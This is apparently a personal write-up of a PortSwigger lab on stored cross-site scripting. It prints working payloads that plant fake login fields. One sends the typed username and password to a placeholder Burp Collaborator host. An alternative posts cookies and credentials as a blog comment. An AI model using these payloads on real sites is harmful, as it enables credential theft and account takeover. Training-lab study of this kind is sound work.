---
share_link: https://share.note.sx/068x94fw#d3mX3YNal2X9r7Sf4dgIgv2fHW9akXZfFGaTZc2qv/E
share_updated: 2025-05-22T23:53:41+03:00
---
## ÔøΩÔøΩ Lab Summary

**üóìÔ∏è Solution Date:** 22 / 5 / 2025  
**üîó Lab Link:** [Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)  
**üß® Vulnerability Type:** Blind XSS

---

## üß† Lab Concept

- The blog comments contain a **Stored XSS vulnerability**.
    
- When a comment is posted, it is automatically displayed on a page visited by the victim user.
    
- Requirements:  
    ‚úÖ Exploit the vulnerability to make the victim send login credentials to **Burp Collaborator server**.  
    ‚úÖ Then, use these credentials to log in as the victim.
    

---

## üõ†Ô∏è Required Tools

- Burp Suite Professional
- Burp Collaborator (used as exfiltration server)

---

## üöÄ Solution Steps

### 1. Setting up Burp Collaborator

- Open **Burp Suite Professional**.
    
- Go to the **Collaborator client** tab.
    
- Click **Copy to clipboard** to copy your domain (example: `abc123.burpcollaborator.net`).
    

---

## üí£ Detailed Explanation of the Used Payload

### üîπ Complete Payload:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
  method:'POST',
  mode:'no-cors',
  body:username.value+':'+this.value
});">
```

---

### üß© Payload Analysis Element by Element

#### 1.

```html
<input name=username id=username>
```

- This is a text input element for the **username**.
    
- Added `id="username"` so it can be accessed later through JavaScript using `username.value`.
    

#### 2.

```html
<input type=password name=password onchange="...">
```

- This is a password input element.
    
- When the value changes (when the user enters a password), the code in the `onchange` event is executed.
    

---

### ‚öôÔ∏è What Happens Inside `onchange`?

```javascript
if(this.value.length)
```

- Checks if a value has been entered in the password field.
    

```javascript
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body: username.value + ':' + this.value
});
```

- **fetch**: Sends an HTTP request to the Burp Collaborator server.
    
- `method: 'POST'`: The request uses POST to send data.
    
- `mode: 'no-cors'`: This makes the request work without CORS (Cross-Origin Restrictions) issues.
    
- `body`: Sends a text string containing `username:password`.
    

Example of sent data:

```
victimUser:MyPassword123
```

---

### üéØ Final Goal of this Script:

- Steal the user's (victim's) login credentials.
    
- Send the data to Burp Collaborator.
    
- The attacker can capture the data from Burp Suite and use it to log into the victim's account.

---

### 3. Waiting for Victim Interaction

- Go back to **Collaborator client**.
    
- Click **Poll now**.
    
- When an HTTP interaction appears, you'll find the credentials in the **Request body** section like this:
    

![Pasted image](../images/Pasted%20image%2020250522235341.png)

---

### 4. Logging in as Victim

- Go to the site's login page.
    
- Enter the obtained username and password.
    
- If login is successful, the lab is solved ‚úÖ
    ![Pasted image](../images/Pasted%20image%2020250522235341.png)

---

## üí° Alternative Solution
```html
  <input type="text" name="username" id="username" placeholder="Username">
  <input type="password" name="password" id="password" placeholder="Password">

  <script>
    window.addEventListener('DOMContentLoaded', function() {
      document.getElementById('password').addEventListener('change', function() {
        if (this.value) {
          
          // Extract CSRF token value if it exists
          var tokenElem = document.getElementsByName('csrf')[0];
          var token = tokenElem ? tokenElem.value : '';

          // Create form data
          var data = new FormData();
          data.append('csrf', token);
          data.append('postId', 8);

          // Combine cookie info, username, and password in a comment
          data.append('comment', 
            'cookie: ' + document.cookie + '\n' +
            'username: ' + document.getElementById('username').value + '\n' +
            'pass: ' + this.value
          );

          // Add additional complementary information
          data.append('name', 'test name');
          data.append('email', 'test@gmail.com');
          data.append('website', 'http://test.com');

          // Send data to server
          fetch('post/comment', {
            method: 'POST',
            mode: 'no-cors',
            body: data,
          });
        }
      });
    });
  </script>

```

#### ‚úÖ **1. HTML Elements:**

```html
<input type="text" name="username" id="username">
<input type="password" name="password" id="password">
```

- `username`: Text field where the user enters their username.
    
- `password`: Secret field where the user enters their password.
    

---

#### ‚úÖ **2. Script Start:**

```js
window.addEventListener('DOMContentLoaded', function() {
```

- This code is executed **after the page finishes loading** all elements (HTML) completely.
    

---

#### ‚úÖ **3. Monitoring Password Changes:**

```js
document.getElementById('password').addEventListener('change', function() {
```

- Monitors the password field, and as soon as the user **enters a password and leaves the field** (blur), the code inside is executed.
    

---

#### ‚úÖ **4. Verifying Password is Not Empty:**

```js
if(this.value){
```

- If the user actually entered something in the password, we continue executing the rest of the code.
    

---

#### ‚úÖ **5. Getting CSRF Token Value (if it exists):**

```js
var tokenElem = document.getElementsByName('csrf')[0];
var token = tokenElem ? tokenElem.value : '';